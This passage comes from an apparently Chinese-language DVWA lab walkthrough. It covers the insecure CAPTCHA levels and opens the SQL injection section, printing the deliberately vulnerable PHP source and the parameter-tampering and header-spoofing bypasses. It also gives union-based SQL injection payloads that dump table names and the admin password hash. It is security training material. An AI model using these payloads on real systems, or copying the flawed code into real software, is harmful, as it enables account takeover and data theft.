$uploaded_name ) . <span class="string">&#x27;.&#x27;</span> . $uploaded_ext; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( $uploaded_ext ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( $uploaded_ext ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_type == <span class="string">&#x27;image/jpeg&#x27;</span> || $uploaded_type == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span></span><br><span class="line">        <span class="keyword">if</span>( $uploaded_type == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123; </span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp ); </span><br><span class="line">            imagejpeg( $img, $temp_file, <span class="number">100</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp ); </span><br><span class="line">            imagepng( $img, $temp_file, <span class="number">9</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( $img ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder? </span></span><br><span class="line">        <span class="keyword">if</span>( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files </span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( $temp_file ) ) </span><br><span class="line">            unlink( $temp_file ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><h1 id="Insecure-CAPTCHA（不安全的验证）"><a href="#Insecure-CAPTCHA（不安全的验证）" class="headerlink" title="Insecure CAPTCHA（不安全的验证）"></a>Insecure CAPTCHA（不安全的验证）</h1><h2 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2><p>不安全的验证码，<code>CAPTCHA</code>是<code>Completely Automated Public Turing Test to Tell Computers and Humans Apart</code> (全自动区分计算机和人类的图灵测试)的简称。</p><p>做这个实验可能需要先弄验证码，按照dvwa的提示，填一个网域和标签就行（网域就是你的IP或者域名）</p><p><img src="https://i.loli.net/2020/03/02/RmU3NAlMZbkrOj6.png"></p><p>但是这个不是重点，这里我们需要测试的是，如何绕过验证。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( $_POST[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        $_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        $html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&#123;$pass_new&#125;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&#123;$pass_conf&#125;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            $html     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            $hide_form = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( $_POST[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        $insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>借用大佬的一张图，来说明一下<code>reCAPTCHA</code>的验证流程：</p><p><img src="https://i.loli.net/2020/03/02/3qDuw521ZRJKhvo.png"></p><ol><li>用户通过js请求从Google获取序言进行验证的验证码</li><li>用户输入验证码</li><li>服务器通过调用<code>recaptcha_check_answer</code>函数检查用户输入的正确性</li></ol><p>服务器改密码分为两步，第一步检查<code>reCAPTCHA</code>，验证通过后，服务器返回表单，第二部客户端提交POST请求，服务器完后才能改密码操作。但是这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change和step参数来判断用户是否已经输入正确的验证码。</p><p><strong>漏洞利用</strong></p><p>通过构造参数绕过验证过程的第一步</p><p>通过输入密码，点击Change按钮，抓包, 因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有<code>recaptcha_challenge_field，recaptcha_response_field</code>两个参数</p><p>直接将step更改为2，就跳过了验证码的验证过程。密码修改成功。</p><p><img src="https://i.loli.net/2020/03/02/p8slTyoQnOVbHqP.png"></p><h2 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Check to see if they did stage 1 </span></span><br><span class="line">    <span class="keyword">if</span>( !$_POST[ <span class="string">&#x27;passed_captcha&#x27;</span> ] ) &#123; </span><br><span class="line">        $html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA.&lt;/pre&gt;&quot;</span>; </span><br><span class="line">        $hide_form = <span class="literal">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><p>增加了对参数<code>passed_captcha</code>的验证，<strong>payload</strong>增加即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">step&#x3D;2&amp;password_new&#x3D;hack&amp;passed_captcha&#x3D;1&amp;password_conf&#x3D;hack&amp;g-recaptcha-response&#x3D;&amp;Change&#x3D;Change</span><br></pre></td></tr></table></figure><h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">$hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line">$pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">$pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">$resp = recaptcha_check_answer(</span><br><span class="line">$_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">$_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">&amp;&amp; $_SERVER[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">)</span><br><span class="line">)&#123;</span><br><span class="line"><span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line"><span class="keyword">if</span> ($pass_new == $pass_conf) &#123;</span><br><span class="line">$pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">$pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line">$insert = <span class="string">&quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for user</span></span><br><span class="line">$html .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Ops. Password mismatch</span></span><br><span class="line">$html     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">$hide_form = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">$html     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">$hide_form = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">$resp || </span><br><span class="line">(</span><br><span class="line">$_POST[ <span class="string">&#x27;g-recaptcha-response&#x27;</span> ] == <span class="string">&#x27;hidd3n_valu3&#x27;</span></span><br><span class="line">&amp;&amp; $_SERVER[ <span class="string">&#x27;HTTP_USER_AGENT&#x27;</span> ] == <span class="string">&#x27;reCAPTCHA&#x27;</span></span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>可以看到，服务器的验证逻辑是当<code>$resp</code>（谷歌服务器返回的验证）是TRUE，或者参数<code>recaptcha_response_filed == hidd3n_valu3</code>且http包头的<code>User-Agent</code>参数等于<code>reCAPTCHA</code>）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。</p><p><strong>漏洞利用</strong></p><p>绕过验证应该把目标放到后面的条件了。</p><p>更改参数<code>recaptcha_response_field</code>以及http包头的<code>User-Agent</code></p><p><img src="https://i.loli.net/2020/03/03/ojZv9epO1ArfnaU.png"></p><h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    $hide_form = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    $pass_new  = stripslashes( $pass_new );</span><br><span class="line">    $pass_new  = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_new ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_new  = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line">    $pass_conf = stripslashes( $pass_conf );</span><br><span class="line">    $pass_conf = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_conf ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_conf = md5( $pass_conf );</span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $pass_curr ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    $resp = recaptcha_check_answer(</span><br><span class="line">        $_DVWA[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line">        $_POST[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !$resp ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        $hide_form = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do both new password match and was the current password correct?</span></span><br><span class="line">        <span class="keyword">if</span>( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $data = $db-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">            $data-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">            $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the end user - success!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Feedback for the end user - failed!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            $hide_form = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p><h1 id="SQL-Injection（SQL注入）"><a href="#SQL-Injection（SQL注入）" class="headerlink" title="SQL Injection（SQL注入）"></a>SQL Injection（SQL注入）</h1><h2 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h2><p>SQL注入是可在生命中的了，不多说了，直接看代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一句直接拼接和SQL语句，导致注入，有回显，手工注入或者借用sqlmap就可以</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;2 order by 2#&#x2F;&#x2F;2列</span><br><span class="line"></span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,2#</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查数据库和用户名</span><br><span class="line">1&#39; and 1&#x3D;2 union select user(),database()#</span><br><span class="line">root@localhost</span><br><span class="line">dvwa</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查表名</span><br><span class="line">1&#39; and 1&#x3D;2 union select group_concat(TABLE_NAME),2 from information_schema.TABLES where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">guestbook,users</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查列名</span><br><span class="line">1&#39; and 1&#x3D;2 union select group_concat(column_name),2 from information_schema.COLUMNS where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;#</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;查数据，admin的密码md5</span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,password from users where user&#x3D;&#39;admin&#39;#</span><br><span class="line">5f4dcc3b5aa765d61d8327deb882cf99</span><br></pre></td></tr></table></figure><blockquote><p>过程中碰到一个错误：</p><p>Illegal mix of collations for operation ‘UNION’</p><p>说是字符集的错误，详情和解决方法见这两个链接：</p><p><a href="https://www.cnblogs.com/hongthink/p/6225468.html">https://www.cnblogs.com/hongthink/p/6225468.html</a></p><p><a href="http://www.111com.net/database/mysql/56096.htm">http://www.111com.net/database/mysql/56096.htm</a></p></blockquote><h2 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    $id = 